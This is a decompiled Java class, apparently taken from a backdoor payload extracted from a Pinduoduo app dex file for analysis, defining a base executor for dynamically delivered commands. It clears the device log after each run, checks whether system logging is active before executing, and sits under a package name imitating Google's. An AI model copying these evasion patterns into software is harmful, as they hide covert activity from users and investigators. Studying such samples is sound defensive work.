package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import com.google.android.sd.utils.Utils;

public abstract class DynamicCmdExecutor {
  public final void execute(Context paramContext, String paramString) {
    executeAsync(paramContext, paramString);
  }
  
  public final void executeAsync(Context paramContext, String paramString) {
    try {
      preExecute(paramContext, paramString);
      return;
    } finally {
      paramContext = null;
      Utils.clearLogcat();
    } 
  }
  
  public final void executeSync(Context paramContext, String paramString) {
    try {
      preExecute(paramContext, paramString);
      return;
    } finally {
      paramContext = null;
      Utils.clearLogcat();
    } 
  }
  
  protected boolean isReadyToExecute(Context paramContext) {
    return !Utils.isSystemLogging(paramContext);
  }
  
  protected void preExecute(Context paramContext, String paramString) {}
  
  protected abstract void realExecute(Context paramContext, String paramString);
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f35735a5cbf445c785237797138d246a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\DynamicCmdExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */